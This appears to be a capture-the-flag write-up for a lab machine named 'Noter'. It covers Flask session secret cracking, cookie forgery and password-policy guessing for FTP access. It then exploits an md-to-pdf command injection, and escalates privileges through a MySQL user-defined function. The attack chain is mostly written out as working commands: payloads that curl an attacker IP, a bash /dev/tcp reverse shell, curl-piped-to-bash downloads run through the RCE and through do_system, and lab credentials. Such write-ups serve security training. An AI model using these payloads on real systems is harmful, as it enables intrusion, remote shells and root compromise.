# Noter

---

## Enumeration

- nmap TCP scan:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c653c62ae92890504d0c8d6488e0084d (RSA)
|   256 5f12585f497df36cbd9b2549ba09cc43 (ECDSA)
|_  256 f16b0016f788ab00ce96afa67eb5a839 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- FTP server on port 21 requires authentication
- Flask session cookie identified, used `flask-unsign` to crack its secret

```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y5SUDg.JRbpoDh_8ajtiXhFZR6NohkYano'
[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (1792): -----BEGIN PRIVATE KEY-----93a
[+] Found secret key after 19968 attempts size tokenk
'secret123'
```

- Wrote a script to generate Flask session cookies with different usernames and hit `blue` 
- Found FTP creds on `blue`'s notes `blue:blue@Noter!`

```
Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
```

- The pdf found on the FTP server using the user `blue` revealed the password policy of `Noter`
- The default password is `username@Noter!`
- In the notes section on the webapp, I found a user `ftp_admin`, so I tried with FTP with the password `ftp_admin@Noter!` and it worked.
- Got app backup zip files
- Read the source code and found [RCE vulnerability](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880): 

```python
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                        <SNIP>
```

- payload:

```bash
cat game.md              
---js\n((require("child_process")).execSync("curl 10.10.16.4/imPWNED"))\n---RCE
```

- RCE:

```bash
10.10.11.160 - - [10/Dec/2022 10:28:01] "GET /game.md HTTP/1.1" 200 -
10.10.11.160 - - [10/Dec/2022 10:28:02] code 404, message File not found
10.10.11.160 - - [10/Dec/2022 10:28:02] "GET /imPWNED HTTP/1.1" 404 -
```

- To get revshell:

```bash
cat game.sh        
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.4/9000 0>&1"
------------------------------------------------------------------------------------------------------
cat game.md
---js\n((require("child_process")).execSync("curl 10.10.16.4/game.sh -o - | bash"))\n---RCE
------------------------------------------------------------------------------------------------------
10.10.11.160 - - [10/Dec/2022 10:31:06] "GET /game.md HTTP/1.1" 200 -
10.10.11.160 - - [10/Dec/2022 10:31:07] "GET /game.sh HTTP/1.1" 200 -
------------------------------------------------------------------------------------------------------
nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.160] 38942
bash: cannot set terminal process group (1264): Inappropriate ioctl for device
bash: no job control in this shell
svc@noter:~/app/web$ 
```

---

## PrivEsc

- On enumerating, found a process `mysqld` running as root, found [this article](https://redteamnation.com/mysql-user-defined-functions/)

```bash
svc@noter:/etc/mysql/mariadb.conf.d$ cat 50-server.cnf  | grep user
user                    = root
```

- With the previously found mysql creds, I used this exploit to privesc `root:Nildogg36`

```
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
show variables like '%plugin%';
select * from foo into dumpfile "/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so";
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('curl 10.10.16.4/game.sh -o - | bash');
```

- rooted:

```bash
nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.160] 39434
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
root@noter:/var/lib/mysql# 

```